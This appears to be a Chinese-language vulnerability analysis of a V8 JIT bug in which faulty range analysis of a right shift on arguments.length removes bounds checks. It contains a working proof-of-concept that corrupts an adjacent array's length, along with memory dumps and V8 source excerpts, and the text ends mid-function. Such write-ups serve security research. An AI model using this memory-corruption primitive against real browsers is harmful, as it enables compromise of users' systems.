## 参考链接
  * 
  * 
## PoC
    // Flags: --allow-natives-syntax
    function fun(arg) {
      let x = arguments.length;
      a1 = new Array(0x10);
      a1[0] = 1.1;
      a2 = new Array(0x10);
      a2[0] = 1.1;
      a1[(x >> 16) * 21] = 1.39064994160909e-309;  // 0xffff00000000
      a1[(x >> 16) * 41] = 8.91238232205e-313;  // 0x2a00000000
    }
    var a1, a2;
    var a3 = [1.1,2.2];
    a3.length = 0x11000;
    a3.fill(3.3);
    var a4 = [1.1];
    for (let i = 0; i  {
               0: 1.1
            1-15: 
     }
    a2:
    DebugPrint: 0x358226e9b941: [JSArray]
     - length: 42
     - elements: 0x358226e9b8b1  {
               0: 1.1
            1-15: 
              16: 2.90681e-310
              17: 2.90688e-310
              18: 2.90674e-310
              19: 8.91238e-313
        20-51430: -1.18859e+148
    a1 elements:
    lldb) x/50gx 0x358226e9b801-1
    0x358226e9b800: 0x00003582ced81461 0x0000001000000000
    0x358226e9b810: 0x3ff199999999999a->a1[0] 0xfff7fffffff7ffff
    0x358226e9b820: 0xfff7fffffff7ffff 0xfff7fffffff7ffff
    0x358226e9b830: 0xfff7fffffff7ffff 0xfff7fffffff7ffff
    0x358226e9b840: 0xfff7fffffff7ffff 0xfff7fffffff7ffff
    0x358226e9b850: 0xfff7fffffff7ffff 0xfff7fffffff7ffff
    0x358226e9b860: 0xfff7fffffff7ffff 0xfff7fffffff7ffff
    0x358226e9b870: 0xfff7fffffff7ffff 0xfff7fffffff7ffff
    0x358226e9b880: 0xfff7fffffff7ffff 0xfff7fffffff7ffff
    a1 object:
    0x358226e9b890: 0x0000358279782f29 0x00003582ced80c29
    0x358226e9b8a0: 0x0000358226e9b801 0x0000001000000000
    a2 elements:
    0x358226e9b8b0: 0x00003582ced81461 0x0000ffff00000000->a1[21]
    0x358226e9b8c0: 0x3ff199999999999a 0xfff7fffffff7ffff
    0x358226e9b8d0: 0xfff7fffffff7ffff 0xfff7fffffff7ffff
    0x358226e9b8e0: 0xfff7fffffff7ffff 0xfff7fffffff7ffff
    0x358226e9b8f0: 0xfff7fffffff7ffff 0xfff7fffffff7ffff
    0x358226e9b900: 0xfff7fffffff7ffff 0xfff7fffffff7ffff
    0x358226e9b910: 0xfff7fffffff7ffff 0xfff7fffffff7ffff
    0x358226e9b920: 0xfff7fffffff7ffff 0xfff7fffffff7ffff
    0x358226e9b930: 0xfff7fffffff7ffff 0xfff7fffffff7ffff
    a2 object:
    0x358226e9b940: 0x0000358279782f29 0x00003582ced80c29
    0x358226e9b950: 0x0000358226e9b8b1 0x0000002a00000000->a1[41]
    0x358226e9b960: 0xdeadbeedbeadbeef 0xdeadbeedbeadbeef
    0x358226e9b970: 0xdeadbeedbeadbeef 0xdeadbeedbeadbeef
    0x358226e9b980: 0xdeadbeedbeadbeef 0xdeadbeedbeadbeef
    function fun(arg) {
        let x = arguments.length;// x = 65536，但范围分析认为是65534
        a1 = new Array(0x10);
        a1[0] = 1.1;
        a2 = new Array(0x10);
        a2[0] = 1.1;
        x = x >> 16;// x = 65536>>16 = 1,但范围分析认为是65534>>16 = 0
        a1[x * 21] = 1.39064994160909e-309;  // 0xffff00000000
        a1[x * 41] = 8.91238232205e-313;  // 0x2a00000000  
    }
漏洞验证，边界检查被移除后的越界读写
    1.1
    undefined
    undefined
    undefined
    undefined
    undefined
    undefined
    undefined
    undefined
    undefined
    undefined
    undefined
    undefined
    undefined
    undefined
    undefined
    3.5906059781413e-311
    3.592134784647e-311
    3.5918890420468e-311
    8.91238232205e-313
    3.5921347865955e-311
    8.487983164e-314
    4.243991582e-314
    0
    3.5906059883793e-311
    3.592134783722e-311
    3.592134783722e-311
    3.5921347865955e-311
    1.4853970537e-313
    1.0609978955e-313
    0
    3.590605972767e-311
    3.5906059725297e-311
    3.5906059886165e-311
    3.590605982569e-311
    3.592134783722e-311
    3.592134783722e-311
    3.592134783793e-311
    1.1
    3.592134783793e-311
    3.5906059781413e-311
    3.592134783793e-311
    42
## Root Cause
在typer phase里对SpeculativeNumberShiftRight的range进行计算
    #72:SpeculativeNumberShiftRight[SignedSmall](#102:LoadField, #27:NumberConstant, #70:Checkpoint, #55:JSCreateArray)
        102: LoadField[tagged base, 24, #length, NonInternal, kRepTagged|kTypeAny, FullWriteBarrier](9, 101, 18)
        27: NumberConstant[16]
由于在typer phase还不会对Load处理，于是在第一次对NumberShiftRight进行range
analysis的时候，会将其范围直接当做int32的最大和最小值。
    #   define INT32_MIN       ((int32_t)(-2147483647-1))
    #   define INT32_MAX       ((int32_t)(2147483647))
    Type OperationTyper::NumberShiftRight(Type lhs, Type rhs) {
      DCHECK(lhs.Is(Type::Number()));
      DCHECK(rhs.Is(Type::Number()));
      lhs = NumberToInt32(lhs);
      rhs = NumberToUint32(rhs);
      if (lhs.IsNone() || rhs.IsNone()) return Type::None();
      int32_t min_lhs = lhs.Min();
      int32_t max_lhs = lhs.Max();
      uint32_t min_rhs = rhs.Min();
      uint32_t max_rhs = rhs.Max();
      if (max_rhs > 31) {
        // rhs can be larger than the bitmask
        max_rhs = 31;
        min_rhs = 0;
      }
      double min = std::min(min_lhs >> min_rhs, min_lhs >> max_rhs);
      double max = std::max(max_lhs >> min_rhs, max_lhs >> max_rhs);
      printf("min lhs is %d\n", min_lhs);
      printf("min rhs is %d\n", min_rhs);
      printf("max lhs is %d\n", max_lhs);
      printf("max rhs is %d\n", max_rhs);
      if (max == kMaxInt && min == kMinInt) return Type::Signed32();
      return Type::Range(min, max, zone());
    }
于是在第一次对NumberShiftRight进行range analysis之后得到
    min lhs is -2147483648
    min rhs is 16
    max lhs is 2147483647
    max rhs is 16
    ...
    [Type: Range(-32768, 32767)]
然后在typer lowering phase里将JSCreateArray reduce成ArgumentsLength,并计算其范围。
    Reduction JSCreateLowering::ReduceJSCreateArguments(Node* node) {
      DCHECK_EQ(IrOpcode::kJSCreateArguments, node->opcode());
      CreateArgumentsType type = CreateArgumentsTypeOf(node->op());
      Node* const frame_state = NodeProperties::GetFrameStateInput(node);
      Node* const outer_state = frame_state->InputAt(kFrameStateOuterStateInput);
      Node* const control = graph()->start();
      FrameStateInfo state_info = FrameStateInfoOf(frame_state->op());
      SharedFunctionInfoRef shared(broker(),
                                   state_info.shared_info().ToHandleChecked());
      // Use the ArgumentsAccessStub for materializing both mapped and unmapped
      // arguments object, but only for non-inlined (i.e. outermost) frames.
      if (outer_state->opcode() != IrOpcode::kFrameState) {
        switch (type) {
          case CreateArgumentsType::kMappedArguments: {
            // TODO(mstarzinger): Duplicate parameters are not handled yet.
            if (shared.has_duplicate_parameters()) return NoChange();
            Node* const callee = NodeProperties::GetValueInput(node, 0);
            Node* const context = NodeProperties::GetContextInput(node);
            Node* effect = NodeProperties::GetEffectInput(node);
            Node* const arguments_frame =
                graph()->NewNode(simplified()->ArgumentsFrame());
            Node* const arguments_length = graph()->NewNode(
                simplified()->ArgumentsLength(
                    shared.internal_formal_parameter_count(), false),
                arguments_frame);
            // Allocate the elements backing store.
            bool has_aliased_arguments = false;
            Node* const elements = effect = AllocateAliasedArguments(
                effect, control, context, arguments_frame, arguments_length, shared,
                &has_aliased_arguments);
            // Load the arguments object map.
            Node* const arguments_map = jsgraph()->Constant(
                has_aliased_arguments
                    ? native_context().fast_aliased_arguments_map()
                    : native_context().sloppy_arguments_map());
            // Actually allocate and initialize the arguments object.
            AllocationBuilder a(jsgraph(), effect, control);
            Node* properties = jsgraph()->EmptyFixedArrayConstant();
            STATIC_ASSERT(JSSloppyArgumentsObject::kSize == 5 * kPointerSize);
            a.Allocate(JSSloppyArgumentsObject::kSize);
            a.Store(AccessBuilder::ForMap(), arguments_map);
            a.Store(AccessBuilder::ForJSObjectPropertiesOrHash(), properties);
            a.Store(AccessBuilder::ForJSObjectElements(), elements);
            a.Store(AccessBuilder::ForArgumentsLength(), arguments_length);
            a.Store(AccessBuilder::ForArgumentsCallee(), callee);
            RelaxControls(node);
            a.FinishAndChange(node);
            return Changed(node);
          }
          ...
          ...
    void Typer::Decorator::Decorate(Node* node) {
      if (node->op()->ValueOutputCount() > 0) {
        // Only eagerly type-decorate nodes with known input types.
        // Other cases will generally require a proper fixpoint iteration with Run.
        bool is_typed = NodeProperties::IsTyped(node);
        if (is_typed || NodeProperties::AllValueInputsAreTyped(node)) {
          Visitor typing(typer_, nullptr);